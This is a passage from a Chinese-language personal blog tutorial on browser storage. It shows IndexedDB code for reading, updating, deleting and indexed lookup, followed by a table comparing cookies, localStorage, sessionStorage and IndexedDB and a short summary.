<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function readAll() &#123;</span><br><span class="line">  var objectStore = db.transaction(&#x27;person&#x27;).objectStore(&#x27;person&#x27;);</span><br><span class="line"></span><br><span class="line">   objectStore.openCursor().onsuccess = function (event) &#123;</span><br><span class="line">     var cursor = event.target.result;</span><br><span class="line"></span><br><span class="line">     if (cursor) &#123;</span><br><span class="line">       console.log(&#x27;Id: &#x27; + cursor.key);</span><br><span class="line">       console.log(&#x27;Name: &#x27; + cursor.value.name);</span><br><span class="line">       console.log(&#x27;Age: &#x27; + cursor.value.age);</span><br><span class="line">       console.log(&#x27;Email: &#x27; + cursor.value.email);</span><br><span class="line">       cursor.continue();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.log(&#x27;没有更多数据了！&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">readAll();</span><br></pre></td></tr></table></figure>

<p>上面代码中，新建指针对象的<strong>openCursor()方法</strong>是一个异步操作，所以要监听 success 事件。</p>
<h4 id="3-6-更新数据"><a href="#3-6-更新数据" class="headerlink" title="3.6.更新数据"></a>3.6.更新数据</h4><p>更新数据要使用<strong>IDBObject.put()方法</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function update() &#123;</span><br><span class="line">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class="line">    .objectStore(&#x27;person&#x27;)</span><br><span class="line">    .put(&#123; id: 1, name: &#x27;李四&#x27;, age: 35, email: &#x27;lisi@example.com&#x27; &#125;);</span><br><span class="line"></span><br><span class="line">  request.onsuccess = function (event) &#123;</span><br><span class="line">    console.log(&#x27;数据更新成功&#x27;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.onerror = function (event) &#123;</span><br><span class="line">    console.log(&#x27;数据更新失败&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">update();</span><br></pre></td></tr></table></figure>

<p>上面代码中，put()方法自动更新了主键为 1 的记录。</p>
<h4 id="3-7-删除数据"><a href="#3-7-删除数据" class="headerlink" title="3.7.删除数据"></a>3.7.删除数据</h4><p><strong>IDBObjectStore.delete()方法</strong>用于删除记录。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function remove() &#123;</span><br><span class="line">  var request = db.transaction([&#x27;person&#x27;], &#x27;readwrite&#x27;)</span><br><span class="line">    .objectStore(&#x27;person&#x27;)</span><br><span class="line">    .delete(1);</span><br><span class="line"></span><br><span class="line">  request.onsuccess = function (event) &#123;</span><br><span class="line">    console.log(&#x27;数据删除成功&#x27;);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">remove();</span><br></pre></td></tr></table></figure>

<h4 id="3-8-使用索引"><a href="#3-8-使用索引" class="headerlink" title="3.8.使用索引"></a>3.8.使用索引</h4><p>索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。</p>
<p>假定新建表格的时候，对 name 字段建立了索引。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.createIndex(&#x27;name&#x27;, &#x27;name&#x27;, &#123; unique: false &#125;);</span><br></pre></td></tr></table></figure>

<p>现在，就可以从 name 找到对应的数据记录了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var transaction = db.transaction([&#x27;person&#x27;], &#x27;readonly&#x27;);</span><br><span class="line">var store = transaction.objectStore(&#x27;person&#x27;);</span><br><span class="line">var index = store.index(&#x27;name&#x27;);</span><br><span class="line">var request = index.get(&#x27;李四&#x27;);</span><br><span class="line"></span><br><span class="line">request.onsuccess = function (e) &#123;</span><br><span class="line">  var result = e.target.result;</span><br><span class="line">  if (result) &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关闭-IndexDB"><a href="#关闭-IndexDB" class="headerlink" title="关闭 IndexDB"></a>关闭 IndexDB</h3><p><strong>indexdb.close()</strong></p>
<h2 id="3-WebStorage、cookie-和-IndexedDB-之间的区别"><a href="#3-WebStorage、cookie-和-IndexedDB-之间的区别" class="headerlink" title="3.WebStorage、cookie 和 IndexedDB 之间的区别"></a>3.WebStorage、cookie 和 IndexedDB 之间的区别</h2><table>
<thead>
<tr>
<th>特性</th>
<th align="left">cookie</th>
<th align="left">localstorage</th>
<th align="left">sessionstorage</th>
<th align="left">indexDB</th>
</tr>
</thead>
<tbody><tr>
<td>数据生命周期</td>
<td align="left">一般有服务器生成，可以设置过期时间</td>
<td align="left">除非被清除，否则一直存在</td>
<td align="left">页面关闭就清理</td>
<td align="left">除非被清除，否则一直存在</td>
</tr>
<tr>
<td>数据存储大小</td>
<td align="left">4K</td>
<td align="left">5M</td>
<td align="left">5M</td>
<td align="left">无限</td>
</tr>
<tr>
<td>与服务端通信</td>
<td align="left">每次都会携带在 header 里，对于性能有很大影响</td>
<td align="left">不参与</td>
<td align="left">不参与</td>
<td align="left">不参与</td>
</tr>
</tbody></table>
<p>从上表可以看到，cookie 已经不建议用于存储。如果没有大量数据存储需求的话，可以使用 localStorage 和 sessionStorage 。对于不怎么改变的数据尽量使用 localStorage 存储，否则可以用 sessionStorage 存储。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>正是浏览器存储、缓存技术的出现和发展，为我们的前端应用带来了无限的转机。近年来基于存储、缓存技术的第三方库层出不绝，此外还衍生出了 PWA 这样优秀的 Web 应用模型。总结下本文几个核心观点：</p>
<ul>
<li>Cookie 的本职工作并非本地存储，而是“维持状态”</li>
<li>Web Storage 是 HTML5 专门为浏览器存储而提供的数据存储机制，不与服务端发生通信</li>
<li>IndexedDB 用于客户端存储大量结构化数据</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Nancy Zheng</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
